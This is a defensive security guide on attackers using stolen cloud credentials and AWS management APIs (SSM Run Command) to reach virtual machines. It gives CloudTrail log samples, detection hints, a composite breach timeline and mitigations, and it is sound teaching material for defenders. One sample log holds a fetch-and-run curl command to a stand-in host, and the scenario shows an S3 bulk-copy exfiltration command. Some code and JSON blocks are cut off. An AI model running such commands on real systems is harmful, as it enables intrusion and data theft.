Cloud Services as Remote Doors

Cloud services let one computer manage another through the cloud provider's own internet doors. An attacker with stolen cloud credentials can run commands on your virtual machines, read your storage, and mint new keys — without ever logging into an operating system. No VPN, no SSH key, no open port.

Written for beginners, SOC analysts, and detection engineers. Every example here is for learning and defense only. This guide shows the attack steps, the cloud logs the attack leaves behind, and how to catch it.

Red Team Perspective

Why attackers use the cloud's own management services to reach your VMs — and what they need to do it.

This section explains the attacker's view. Knowing how attackers work is the first step to stopping them. Everything here is public knowledge, written for defenders and students.

Ethics first: You must never test cloud accounts you do not own or do not have written permission to test. Using stolen credentials is a crime, even "just to look". Red teams work inside their own lab accounts, under strict written rules, with spending alarms switched on.

What are cloud services, in simple words?

The cloud means computers that Amazon, Microsoft, or Google own, and that companies rent piece by piece. Each company talks to its rented machines through the control plane. The control plane is a set of internet APIs. An API is a machine-to-machine way to ask for things. These APIs can create, change, and control everything you rent.

You use the control plane in three ways. The web console is a website with buttons. The CLI is a command-line tool you type into, like aws or gcloud. And code can make direct API calls. All three run commands in the cloud itself. And here is the key idea: some of those commands reach inside your virtual machines. A VM (virtual machine) is a software computer running on the provider's hardware. When you ask the control plane to "run this script on VM X", the provider delivers it. No SSH key, no VPN tunnel, no open port on the VM.

Why this matters: For years, defenders focused on ports: keep SSH and RDP closed and you are safe. Cloud services make that model leak. The attacker does not connect to your VM. They connect to the cloud provider, which is always reachable — and the provider connects to the VM from the inside.

The doors: provider examples

These services exist because they are genuinely good for admins: no keys to manage, no ports to expose, full logging in one place. That is also why they are dangerous: an attacker with valid identity and permission is indistinguishable from an admin.

One technique, four kinds of platforms: MITRE lists this technique for four platform kinds. IaaS means rented virtual machines. Identity providers are systems like Okta or Microsoft Entra ID that hold your logins. Office suites are Microsoft 365 and Google Workspace. SaaS covers cloud apps in general. The door is always the same: a valid cloud identity plus a management API. Our examples use AWS, but every step has a matching move in Entra ID, Okta, or Microsoft 365.

Why attackers pick cloud doors

  • It blends with admin automation. Hundreds of SendCommand calls happen every day for patching and deploys. One more, from a "CI" user, hides in the noise.
  • The console ships a terminal. AWS CloudShell is a browser shell with the session's credentials already loaded. A stolen cookie thus gives typed commands, not just clicks, from trusted cloud IP ranges.
  • It bypasses network controls entirely. Firewalls, IP allow lists, and VPN rules do not apply. The attacker's traffic ends at the provider; the provider's traffic to the VM is trusted by design.
  • The host never sees a login. No auth.log line, no Windows 4624, no SSH key in authorized_keys. Host-based detection has almost nothing to catch.
  • It works on private machines. A VM with no public IP and no inbound rules is still reachable, because the agent makes an outbound connection to the provider.
  • Scale is free. One API call can hit 500 instances at once. Ransomware speed without a single exploit.

Where it fits in an attack

Cloud services abuse is a Lateral Movement technique. It usually comes after the attacker has stolen a cloud identity, but it can also be the very first step when keys are bought from a market. A typical order looks like this:

1. Steal or buy keys→ 2. "Who am I?" in the cloud→ 3. Enumerate VMs, buckets, roles→ 4. SendCommand / StartSession→ 5. Read data, grab role keys→ 6. Mint a new key, stay

What does an attacker need?

  • A valid identity. It can take three shapes. A long-lived access key pair: an aws_access_key_id like AKIA... plus its aws_secret_access_key. A temporary session token triple: aws_access_key_id, aws_secret_access_key, and aws_session_token (temporary keys start with ASIA). Or a stolen browser session cookie. Malware called info-stealers harvests these from laptops and CI runners by the million.
  • The right IAM permission. IAM (Identity and Access Management) is the cloud's permission system. For this technique the attacker needs something like ssm:SendCommand or ssm:StartSession. CI users and "power users" often hold far more than they need.
  • The agent on the target. The SSM agent is on by default in most official Amazon and Ubuntu images. On Azure, the VM agent is always there.
  • An outbound path from the VM. The agent must reach the provider to fetch jobs. That path exists in almost every real environment.

How does it look in practice? (lab only)

Run these only in your own test account. They show the three moves from our story: check identity, look around read-only, and run one harmless command on a VM you own.

# Lab only: list buckets this identity can see (read-only)

  --document-name AWS-RunShellScript \
  --comment "lab connectivity check" \

# Note: send-command has no full dry-run. Practice on a throwaway VM,

Blue Team / SOC Perspective

What cloud-service abuse looks like to defenders, where the evidence lives, and what to do first.

The SOC (Security Operations Center) is the team that watches alerts and logs all day. For cloud attacks, the rules of the game change: the best evidence is not on the machines — it is in the cloud's own record of every API call. In the attack chain this technique sits in the middle: the attacker already holds a cloud identity, and the data theft or damage usually comes next.

Why the VM is the wrong place to look

AWS Systems Manager (SSM) Run Command leaves exactly one API line in CloudTrail, plus a small agent job on the machine. The VM records no SSH login, no Windows logon, no failed password. A team that only reads host logs will see an agent completing a task and nothing else. This is the single biggest blind spot in cloud detection: the logs that matter most live one level above the machines.

Watch out: On the VM itself, the command runs as ssm-user or the agent's service account. Some teams see that account in process lists and ignore it as "normal agent noise". It is normal — until someone else starts typing through it.

Where to look — first checks

  • Is the organization trail on for all regions, writing to a log bucket nobody in the account can delete?
  • Are S3 data events enabled for the buckets that hold customer or cardholder data?
  • Who normally uses SendCommand and StartSession? Build that allow-list before you write alerts.
  • Do console logins require MFA, and do you alert when MFAUsed = No appears in CloudTrail?
  • Are identity-provider sign-in logs (Entra ID, Okta) in the SIEM? Watch new ipAddress values and new appDisplayName entries per userPrincipalName.
  • How old are the access keys? Any key created by a user for itself, or never rotated?
  • Are GuardDuty / Defender for Cloud / Security Command Center findings routed into the SIEM, or do they die in a web page nobody reads?
  • Do SCP guardrails deny StopLogging and DeleteTrail for everyone?
  • Do you have canary items — a fake bucket or fake key — that page you the moment someone touches them?

First response when it fires

When a cloud-identity alert is confirmed, minutes matter. A good first-response order:

  1. Disable the identity — do not delete it. Deletion destroys evidence; disabling keeps logs attached.
  2. Kill live sessions. Removing the user does not end a stolen console session by itself. Revoke session tokens explicitly.
  3. Rotate and delete keys for that user and for any instance role it could reach.
  4. Search all regions, not just the busy one. Attackers love quiet regions.
  5. Assume full reach. Everything that identity could touch is now "maybe read": list it, then review it.
  6. Preserve evidence. Export the trail range, snapshot the buckets, keep the SSM command output.
  7. Check the VMs. Read the SSM agent log and command output to learn exactly what ran inside.
SaaS counts too. The same idea applies to Microsoft 365 and Google Workspace: admin consoles and admin CLIs are doors to company data. The log names differ (Unified Audit Log, Workspace Admin audit), but the "watch the control plane, not the host" rule is identical.

Threat Intelligence

Threat intelligence (CTI) answers one question for this technique: who does this, and how? The workflow has three steps. Collect from sources that cover cloud attacks. Analyze by mapping reports to ATT&CK and asking "which of our identities could do this?". Apply by turning each report into a hunting question or a Sigma rule, then tune it with your baseline.

Hunting hypotheses

  • "SendCommand by a principal that never used it." Baseline 30 days of SendCommand by user identity ARN. Any new ARN — even a human admin — deserves a look, because most admins use Session Manager, not Run Command.
  • "Console login without MFA from a new ASN or country." Join CloudTrail ConsoleLogin events with your geo feed. Flag MFAUsed: No and any autonomous system number (ASN — the network owner behind an IP) that never logged in before.
  • "CreateAccessKey followed by use from a new IP within an hour." A self-created key that is used from a different network than the creator's normal one is a persistence signal.

Logs & Patterns

Each block below shows the logs to use, a realistic sample, and what to look for. Samples are AWS CloudTrail JSON — the same shape applies to Azure Activity Log and GCP Audit Logs.

Threat 1 — Remote execution via SSM by an abused identity

Logs: CloudTrail management events for ssm.amazonaws.com, plus the SSM agent log on the instance. The CloudTrail line is the witness; the agent log confirms what ran.

json
{
  "eventVersion": "1.09",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::111122223333:user/dev_portal_ci",
    "accountId": "111122223333",
    "userName": "dev_portal_ci",
    "accessKeyId": "AKIA4XK2EXAMPLE"
  },
  "eventTime": "2026-09-29T02:14:09Z",
  "eventSource": "ssm.amazonaws.com",
  "eventName": "SendCommand",
  "awsRegion": "eu-west-1",
  "sourceIPAddress": "203.0.113.9",
  "userAgent": "aws-cli/2.15.0 linux/x86_64",
  "requestParameters": {
    "documentName": "AWS-RunShellScript",
    "instanceIds": ["i-0abc123def456"],
    "parameters": { "commands": ["curl -s http://203.0.113.9/x -o /tmp/x; sh /tmp/x"] }
  },
  "responseElements": { "command": { "commandId": "4d21c9e8-6f1a-4f19-a2b7-8d3f1e9c4a55" } }
}
  • SendCommand where the caller ARN is a human user or a CI role, not your patching automation.
  • documentName of AWS-RunShellScript or AWS-RunPowerShellScript called from a new IP or ASN.
  • Commands containing curl, wget, sh, or base64 blobs in parameters.commands.
  • One caller hitting many instanceIds in a short window.

Threat 2 — Bulk object-storage exfiltration

Logs: CloudTrail S3 data events (GetObject). They are high-volume, so most teams watch a summarized view rather than single events. This is what a stats search over 30 minutes returns:

json
{
  "summaryLine": true,
  "eventName": "GetObject",
  "principal": "arn:aws:iam::111122223333:user/dev_portal_ci",
  "bucket": "prod-pii",
  "getCalls": 8412,
  "distinctKeys": 6100,
  "sourceIPs": ["203.0.113.9"],
  "window": "30m",
  "note": "summary of 8,412 raw GetObject events - one per object read"
}
  • GetObject counts per principal far above their 30-day baseline (think thousands, not dozens).
  • Reads of buckets with customer, health, or cardholder data by identities that never read them before.
  • A single new source IP reading from many different object keys in sequence.

Threat 3 — IAM access-key persistence

Logs: CloudTrail events for iam.amazonaws.com. The dangerous pattern is a user creating a key for itself, or anyone creating keys outside your key-issuing process.

json
{
  "eventTime": "2026-09-29T02:41:33Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateAccessKey",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::111122223333:user/dev_portal_ci",
    "userName": "dev_portal_ci"
  },
  "sourceIPAddress": "203.0.113.9",
  "requestParameters": { "userName": "dev_portal_ci" },
  "responseElements": {
    "accessKey": {
      "accessKeyId": "AKIAVXQ7EXAMPLE",
      "status": "Active",
      "userName": "dev_portal_ci",
      "createDate": "2026-09-29T02:41:33Z"
    }
  }
}
  • userName in the request equals the caller — a self-created key.
  • Any CreateAccessKey that did not come from your approved joining or rotation automation.
  • The new key ID appearing in later events from a different IP than the creator used.

Threat 4 — Session-cookie theft bypassing MFA

Logs: CloudTrail ConsoleLogin events from signin.amazonaws.com. A stolen cookie replays the session, so MFA is never challenged again and the field shows MFAUsed: No.

json
{
  "eventTime": "2026-09-29T01:02:55Z",
  "eventSource": "signin.amazonaws.com",
  "eventName": "ConsoleLogin",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::111122223333:user/dev_portal_ci",
    "userName": "dev_portal_ci"
  },
  "sourceIPAddress": "89.160.20.112",
  "additionalEventData": {
    "MFAUsed": "No",
    "LoginTo": "https://console.aws.amazon.com/",

  • ConsoleLogin success where MFAUsed is No — the session was restored, not freshly authenticated.
  • Login from a new country or ASN for that user, especially shortly after a phishing report.
  • A "login" with no corresponding MFA push or passkey event in your identity provider around the same minute.

Threat 5 — Logging disabled or detectors muted

Logs: CloudTrail events on cloudtrail.amazonaws.com. Even a denied attempt is gold: it proves a hostile actor is inside and guessing. This sample shows the guardrail working:

json
{
  "eventTime": "2026-09-29T03:05:12Z",

  "eventName": "StopLogging",

  • GuardDuty or monitoring configurations changed by unusual principals.
  • Gaps in log delivery from a region (an attacker with a lucky permission may not try, just disable).

Threat 6 — Instance-role credential abuse

Logs: STS events in CloudTrail plus GuardDuty. Reading the metadata address (169.254.169.254) itself happens inside the VM and is not a CloudTrail event — but the temporary ASIA keys then betray themselves when used elsewhere. GuardDuty names this pattern directly:

json
{
  "schemaVersion": "2.0",
  "accountId": "111122223333",
  "region": "eu-west-1",
  "type": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
  "severity": 8,
  "title": "EC2 instance credentials used from an external IP address.",
  "description": "Temporary credentials created on instance i-0abc123 were used from IP 203.0.113.9, which belongs to a non-AWS network.",
  "service": {
    "serviceName": "guardduty",
    "action": {
      "actionType": "AWS_API_CALL",
      "awsApiCallAction": { "api": "GetCallerIdentity", "remoteIpDetails": { "ipAddressV4": "203.0.113.9" } }
    }
  },
  "resource": { "instanceDetails": { "instanceId": "i-0abc123", "platform": "Linux" } }
}
  • The InstanceCredentialExfiltration finding — treat it as a confirmed incident, not a warning.
  • ASIA-prefixed access keys (temporary) appearing in events from IP addresses outside your cloud and VPN ranges.
  • AssumeRole or GetCallerIdentity calls where the session name is an instance ID but the source IP is a datacenter or residential network.

Threat 7 — Rare API enumeration / recon

Logs: CloudTrail management events, Describe*, List*, and Get* calls. Alone each is harmless; the burst is the signal. A summarized view again works best:

json
{
  "summaryLine": true,
  "principal": "arn:aws:iam::111122223333:user/dev_portal_ci",
  "window": "15m",
  "distinctEventNames": 63,
  "samples": ["DescribeInstances", "ListBuckets", "DescribeSecurityGroups", "GetBucketPolicy", "ListUsers", "DescribeSubnets"],
  "sourceIPAddress": "203.0.113.9",
  "note": "normal admin days show 5-10 distinct read calls for this user"
}
  • One principal touching 50+ distinct read-event names in 15 minutes — machines enumerate, humans do not.
  • Enumeration followed within the hour by SendCommand, CreateAccessKey, or GetObject on the items discovered.
  • New or dormant identities (CI users, interns, old admins) suddenly showing curiosity.

Threat 8 — Dev/test automation false positives

Logs: The same CloudTrail events — that is the problem. Legitimate automation looks almost identical to the attack, so your allow-list matters more than your thresholds. A normal CI SendCommand looks like this:

json
{
  "eventTime": "2026-09-29T12:00:01Z",
  "eventSource": "ssm.amazonaws.com",
  "eventName": "SendCommand",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::111122223333:assumed-role/ci-runner/pipeline-1234"
  },
  "sourceIPAddress": "10.60.0.14",
  "requestParameters": {
    "documentName": "AWS-RunShellScript",
    "instanceIds": ["i-0deploy777"],
    "parameters": { "commands": ["systemctl restart app"] }
  },
  "note": "expected every weekday at 12:00 from the CI network - allow-list it"

  • Keep an allow-list of automation ARNs, their source ranges, and their schedules. Tune rules against it.
  • Flag changes from the baseline: new ARNs, new commands, new hours — not the known-good pattern itself.
  • Never "fix" alert fatigue by disabling a cloud rule; scope it instead (filter the ARN, keep the detection).

Rule 7 — Rare cloud API enumeration burst

Recon before action: one principal asks the cloud about everything it can see. Machines enumerate with wide, fast, repeated calls; humans browse slowly. In Sigma, count(fieldName) counts the distinct values of that field, so the rule measures distinct event names per principal — better than raw counts.

Real-World Scenario: The Retailer Without a VPN

A realistic composite built from two documented campaigns — cloud identities were the only door the attackers needed.

Anchored in real reporting: This story is a realistic composite. It combines two documented campaigns. The first is Scattered Spider (UNC3944): the 2023–2024 wave of help-desk social engineering, MFA fatigue, and console abuse. It hit MGM and Caesars; see CISA advisory AA23-320A. The second is the 2024 Snowflake credential campaign (UNC5537). There, stolen identities led straight to mass data theft. Company names and numbers below are invented, but every step matches how these campaigns actually worked.

Nordvind Retail runs 400 stores and an online shop. Years ago, the cloud team proudly closed every SSH port and VPN tunnel: "we administer everything through the cloud console now". Identity became the only thing standing between the internet and 2.4 million customer records. In September, a criminal crew decided to test that idea.

1. MFA fatigue + help-desk reset→ 2. Okta session token stolen→ 3. SSO into AWS console→ 4. SSM SendCommand on app servers→ 5. S3 data staged out→ 6. New IAM key persists→ 7. Rules fire, containment

Timeline

DAY 1 — 09:12
MFA fatigue pays

The crew spams push approvals to a platform engineer's authenticator app. On the fourteenth push, tired and half-asleep, she taps Approve. Ten minutes later an attacker calls the IT help desk with a confident story about a "lost phone" and gets the second factor reset.

DAY 1 — 09:38
Session token stolen

Days earlier, a fake login page (a reverse proxy) had captured the engineer's Okta session cookie while showing her a perfect copy of the real sign-in. The attacker pastes the cookie into their own browser and opens the identity panel — no password, no MFA prompt.

DAY 1 — 10:05
Into the cloud console

Okta federates straight into the AWS console via SSO. The attacker runs sts get-caller-identity, then a burst of Describe calls maps three app servers, the prod-pii bucket, and a CI user with wide permissions.

DAY 1 — 14:47
Commands through the cloud

Using the CI identity, the attacker issues ssm send-command to the app servers: list folders, fetch the instance role's temporary keys, test outbound access. On the VMs, nothing appears but a small agent job. No login event is written anywhere.

DAY 2 — 03:20
The quiet copy

aws s3 sync s3://prod-pii ./loot downloads 8,412 objects — 61 GB of customer records. The data flows from the bucket directly to the attacker's laptop. No corporate network is involved, so the DLP system sees nothing at all.

DAY 2 — 03:52
A spare key

The attacker creates a new IAM access key for the CI user. Even if every session dies tomorrow, the new key still opens the door. GuardDuty flags the event — into an email folder nobody reads.

DAY 3–4
Close, but muted

The signals are all there: a console login with MFAUsed: No, SendCommand by a user that never used it, a GetObject burst. The trail is on, but no rules watch it. The attackers spend two quiet days exploring.

DAY 5 — 08:30
The rule fires

After a threat-intel briefing on Scattered Spider, the team deployed a Sigma rule for "SendCommand by non-admin principal". At 08:30 it fires. GuardDuty's InstanceCredentialExfiltration finding confirms it. The SOC pages the cloud team.

DAY 5 — 09:00
Containment

Identities disabled (not deleted), sessions revoked, keys rotated, an SCP now denies StopLogging and DeleteTrail for everyone. The attacker's last actions show they tried exactly that — and were refused.

DAY 6 — 16:00
Recovery and report

Sessions are re-issued, bucket policies tightened, the CI user scoped to three actions. The regulator is notified within the 72-hour window that started at confirmation. Customer notification and credit monitoring begin.

What containment looked like

  • Disabled three identities and revoked every active session token — disabling alone would have left the console sessions alive.
  • Deleted the attacker's access key and rotated instance-role keys on all app servers.
  • Applied an organization SCP denying StopLogging, DeleteTrail, and PutEventSelectors.
  • Exported the full trail range as evidence before any cleanup.

What recovery looked like

  • Re-issued sessions to staff through a clean break-glass path with hardware MFA.
  • Reviewed bucket policies: prod-pii now readable only by two named roles.
  • Scoped the CI user to three actions and moved it to short-lived federation tokens.
  • Shipped the missing detections: no-MFA console, SendCommand allow-list, GetObject burst, key creation.

Consequences

  • Regulator notification inside 72 hours of confirming the breach — the discovery delay made this a race, and the data-protection authority opened a follow-up file.
  • Class-action exposure from consumer lawyers within weeks of the customer notification letter.
  • A twelve-month IAM governance program: quarterly permission reviews, key retirement, phishing-resistant MFA for every admin, funded at board level.
  • Trust damage that outlasted the technical fix: two large B2B customers asked for their own audit rights in the contract.

Lessons learned

How the team communicated

  • One war room, one room: cloud engineers, security, legal, and communications sat together — decisions that normally take days took minutes.
  • An executive bridge twice a day plus a written status every hour: facts known, facts unknown, actions running, decisions needed.
  • One spokesperson: all external statements came from comms; engineers never improvised to customers or press.
  • The regulator clock on the board: the 72-hour deadline was visible to everyone, which kept legal and technical work in step.

Mitigation & Defense

Layered controls that make cloud doors useless to thieves — ordered by what stops the most.

You cannot switch these services off — your admins and pipelines need them. The goal is to make each door narrow, short-lived, watched, and wired to a guardrail. Work down this table from the top; the first three rows alone would have stopped the Nordvind story.

ActionStops whatEffort
Phishing-resistant MFA everywhere — FIDO2 keys for all admins and SSO usersMFA fatigue, proxy phishing, help-desk resetsMedium
Short-lived sessions — one-hour console sessions, re-auth for sensitive actionsStolen session cookies and tokens living for daysLow
No long-lived access keys — federation and OIDC only; delete every AKIA key you canKey theft from laptops, repos, and CI runnersMedium
Least privilege + permission boundaries on CI users and power usersA build user running commands on production VMsMedium

Official MITRE mitigations: the ATT&CK page for this technique lists M1032 Multi-factor Authentication and M1026 Privileged Account Management. M1032 means: use MFA on cloud services whenever possible. M1026 means: few high-privileged accounts, no day-to-day use, and no privileged cloud rights for on-premises accounts. A guardrail SCP you can copy

This service control policy (SCP) attaches at the organization root. Nobody in any account — not even administrators — can silence the audit trail. Keep it simple and test it in a sandbox organization first.

json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyDisablingAuditTrail",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail",
        "cloudtrail:UpdateTrail",
        "cloudtrail:PutEventSelectors"
      ],
      "Resource": "*"
    }
  ]
}
bash
# Turn on the organization trail for ALL regions (cloud admins, run once)
aws cloudtrail create-trail \
  --name org-trail \
  --is-multi-region-trail \
  --is-organization-trail \
  --s3-bucket-name my-org-cloudtrail-logs

aws cloudtrail start-logging --name org-trail

Defense in layers

1. Identity: FIDO2, short sessions→ 2. Permissions: least privilege, JIT→ 3. Guardrails: SCPs, no static keys→ 4. Logging: org trail + data events→ 5. Detection: Sigma + GuardDuty→ 6. Response: revoke, rotate, hunt

Each layer assumes the one before it can fail. Keys leak anyway, so sessions are short. Sessions get stolen anyway, so the trail is immutable. Rules misfire anyway, so findings land in one queue with owners. No single control has to be perfect.

For home and personal cloud accounts

If you run a personal AWS, Google Cloud, or Azure account, the same ideas shrink to five habits:

  • Turn on MFA for the root (main) account — use an app or hardware key, not SMS.
  • Never put access keys in code, notes, or chat. If a key leaks into a public repo, assume it is gone and rotate it within minutes.
  • Use a separate low-permission account for daily work; keep the main account for emergencies only.
  • Set billing alarms — miners and data hoarders spend your money before you notice.
  • Once a month, open the account's "recent activity" or security page and read what happened. Ten minutes, once a month.

Best practices for day-to-day detection engineers

  • Ship the org trail into the SIEM first; everything else in the cloud is built on that feed.
  • Keep a reviewed allow-list for SendCommand and StartSession principals — and alert on anyone outside it.
  • Alert on every StopLogging or DeleteTrail attempt, including denials. Denials are pure signal.
  • Alert on self-created access keys and on new keys used from unfamiliar IPs within an hour.
  • Alert on console logins with MFAUsed: No — treat them as probable cookie theft.
  • Track GetObject volume per principal against a 30-day baseline; page on multiples, not fixed numbers.
  • Route GuardDuty, Defender for Cloud, and SCC findings into the SIEM with owners and SLAs.
  • Add canary buckets and canary keys to prod accounts — one touch means one page.
  • Verify the immutable log bucket: no delete permissions for anyone, including cloud admins.
  • Run one sanctioned cloud-attack drill per quarter and tune one rule from what you learn.
Final thought: Cloud services did not remove the old doors — they added better ones. SSH and RDP leave logins; cloud APIs leave only management lines. Watch the control plane the way you once watched port 22, and this whole technique collapses into a handful of high-quality alerts.
